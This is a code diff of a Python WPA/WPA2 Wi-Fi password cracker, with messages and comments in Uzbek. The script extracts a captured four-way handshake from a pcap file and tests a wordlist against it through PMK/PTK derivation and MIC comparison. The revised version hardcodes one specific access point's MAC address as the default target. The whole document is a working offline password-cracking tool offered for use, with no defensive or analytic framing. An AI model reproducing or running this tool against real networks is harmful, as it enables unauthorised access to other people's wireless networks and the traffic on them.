@@ -3,7 +3,7 @@ import hmac
 import hashlib
 import binascii
 import time
-from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11Elt, Dot11
+from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11Elt
 
 def extract_ssid(packets):
     for pkt in packets:
@@ -12,35 +12,31 @@ def extract_ssid(packets):
             return ssid
     return None
 
-def extract_handshake(packets):
-    handshake = {}
+def extract_handshake(packets, target_ap_mac="10:8e:e0:cf:2e:26"):
+    target_ap_mac = target_ap_mac.lower()
     for pkt in packets:
         if pkt.haslayer(EAPOL):
             try:
-                if pkt.addr2:  # AP MAC
-                    ap_mac = pkt.addr2.lower()
-                elif pkt.addr3:  # Sometimes AP MAC is here
-                    ap_mac = pkt.addr3.lower()
-                else:
+                # AP MAC manzilini tekshirish
+                ap_mac = pkt.addr2.lower() if pkt.addr2 else None
+                if ap_mac != target_ap_mac:
                     continue
                     
                 client_mac = pkt.addr1.lower() if pkt.addr1 else None
                 if not client_mac:
                     continue
                     
-                eapol_packet = pkt.getlayer(EAPOL).original
-                if len(eapol_packet) < 97:
+                eapol = pkt.getlayer(EAPOL).original
+                if len(eapol) < 97:
                     continue
                     
-                # Extract MIC (bytes 81-97 in EAPOL frame)
-                mic = eapol_packet[81:97].hex()
+                # MIC va noncelarni olish
+                mic = eapol[81:97].hex()
+                anonce = eapol[13:45]
+                snonce = eapol[45:77]
                 
-                # Zero out MIC field for verification
-                eapol_data = eapol_packet[:81] + bytes(16) + eapol_packet[97:]
-                
-                # Extract nonces (bytes 13-45 and 45-77 in EAPOL frame)
-                anonce = eapol_packet[13:45]
-                snonce = eapol_packet[45:77]
+                # MICsiz EAPOL paketi
+                eapol_data = eapol[:81] + b'\x00'*16 + eapol[97:]
                 
                 return (ap_mac.replace(':', ''),
                        client_mac.replace(':', ''),
@@ -49,22 +45,19 @@ def extract_handshake(packets):
                        mic,
                        eapol_data)
             except Exception as e:
-                print(f"Error processing packet: {e}")
+                print(f"Xato paketda: {e}")
                 continue
     return None, None, None, None, None, None
 
-def get_pmk(passphrase, ssid):
+def pmk(passphrase, ssid):
     return hashlib.pbkdf2_hmac('sha1', 
-                              passphrase.encode('utf-8'), 
-                              ssid.encode('utf-8'), 
-                              4096, 
-                              32)
+                             passphrase.encode('utf-8'), 
+                             ssid.encode('utf-8'), 
+                             4096, 
+                             32)
 
-def get_ptk(pmk, a_mac, s_mac, a_nonce, s_nonce):
-    # PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
-    # PTK = PRF-X(PMK, "Pairwise key expansion",
-    #             Min(AA,SPA) || Max(AA,SPA) ||
-    #             Min(ANonce,SNonce) || Max(ANonce,SNonce))
+def ptk(pmk, a_mac, s_mac, a_nonce, s_nonce):
+    # PTK hisoblash
     min_mac = min(a_mac, s_mac)
     max_mac = max(a_mac, s_mac)
     min_nonce = min(a_nonce, s_nonce)
@@ -74,30 +67,40 @@ def get_ptk(pmk, a_mac, s_mac, a_nonce, s_nonce):
     ptk = b''
     for i in range(4):
         ptk += hmac.new(pmk, 
-                       b"Pairwise key expansion" + 
+                       b"Pairwise key expansion\x00" + 
                        data + 
                        bytes([i]), 
                        hashlib.sha1).digest()
     return ptk[:64]
 
-def crack_wifi(cap_file, wordlist_file):
+def crack(cap_file, wordlist_file):
+    print("Fayllarni yuklash...")
     packets = rdpcap(cap_file)
-    ssid = extract_ssid(packets)
-    if not ssid:
-        ssid = input("SSID topilmadi. Qo'lda kiriting: ")
-
+    ssid = extract_ssid(packets) or input("SSID topilmadi. Kiriting: ")
+    
+    print("Handshake qidirilmoqda...")
     ap_mac, client_mac, anonce, snonce, real_mic, eapol = extract_handshake(packets)
+    
     if not all([ap_mac, client_mac, anonce, snonce, real_mic, eapol]):
-        print("[!] To'liq handshake topilmadi.")
+        print("Xato: To'liq handshake topilmadi!")
+        print("Quyidagilar topildi:")
+        print(f"AP MAC: {ap_mac}")
+        print(f"Client MAC: {client_mac}")
+        print(f"ANonce: {bool(anonce)}")
+        print(f"SNonce: {bool(snonce)}")
+        print(f"MIC: {bool(real_mic)}")
+        print(f"EAPOL: {bool(eapol)}")
         return
 
-    print(f"[i] Tarmoq nomi (SSID): {ssid}")
-    print(f"[i] AP MAC: {ap_mac}")
-    print(f"[i] Client MAC: {client_mac}")
-    print("[i] Parollar sinovda...")
+    print(f"\nTarmoq ma'lumotlari:")
+    print(f"SSID: {ssid}")
+    print(f"AP MAC: {ap_mac}")
+    print(f"Client MAC: {client_mac}")
+    print(f"Handshake paketi topildi!\n")
 
+    print("Parolni tekshirish boshlandi...")
     start_time = time.time()
-    checked = 0
+    tested = 0
 
     try:
         with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
@@ -105,45 +108,47 @@ def crack_wifi(cap_file, wordlist_file):
                 passphrase = line.strip()
                 if not passphrase:
                     continue
-
-                checked += 1
+                
+                tested += 1
                 try:
-                    pmk = get_pmk(passphrase, ssid)
+                    # PMK hisoblash
+                    pmk_val = pmk(passphrase, ssid)
                     
-                    # Convert MAC addresses to bytes
+                    # MAC manzillarni bytes ga o'tkazish
                     a_mac = binascii.unhexlify(ap_mac)
                     s_mac = binascii.unhexlify(client_mac)
                     
-                    ptk = get_ptk(pmk, a_mac, s_mac, anonce, snonce)
-                    
-                    # Calculate MIC
-                    kck = ptk[:16]  # First 16 bytes of PTK is KCK (Key Confirmation Key)
+                    # PTK va MIC hisoblash
+                    ptk_val = ptk(pmk_val, a_mac, s_mac, anonce, snonce)
+                    kck = ptk_val[:16]
                     mic = hmac.new(kck, eapol, hashlib.sha1).digest()[:16].hex()
-
-                    elapsed = time.time() - start_time
-                    rate = checked / elapsed if elapsed > 0 else 0
-
-                    print(f"[{checked}] Sinalayapti: {passphrase[:20]}... | {rate:.2f} parol/s | {int(elapsed)}s o'tdi", end='\r')
-
+                    
+                    # Progressni ko'rsatish
+                    if tested % 100 == 0:
+                        elapsed = time.time() - start_time
+                        speed = tested / elapsed if elapsed > 0 else 0
+                        print(f"Tekshirildi: {tested} | So'nggi: {passphrase[:20]}... | Tezlik: {speed:.1f} parol/s", end='\r')
+                    
                     if mic == real_mic:
-                        print(f"\n[+] Parol topildi: {passphrase}")
+                        elapsed = time.time() - start_time
+                        print(f"\n\n[+] PAROL TOPILDI: '{passphrase}'")
+                        print(f"Testlar soni: {tested}")
+                        print(f"Vaqt: {elapsed:.2f} soniya")
                         return
                         
                 except Exception as e:
-                    print(f"\n[!] Xato '{passphrase}': {e}")
+                    print(f"\nXato parolni tekshirishda: {e}")
                     continue
 
     except KeyboardInterrupt:
-        print("\n[!] To'xtatildi.")
+        print("\nTo'xtatildi.")
         return
 
-    print("\n[-] Parol topilmadi.")
+    print("\n[-] Parol topilmadi. Wordlistda yo'q yoki handshake to'liq emas.")
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print("Foydalanish: python crack_wifi.py handshake.cap wordlist.txt")
+        print("Foydalanish: python crack.py handshake.cap wordlist.txt")
         sys.exit(1)
-
-    cap_path = sys.argv[1]
-    wordlist_path = sys.argv[2]
-    crack_wifi(cap_path, wordlist_path)
+        
+    crack(sys.argv[1], sys.argv[2])
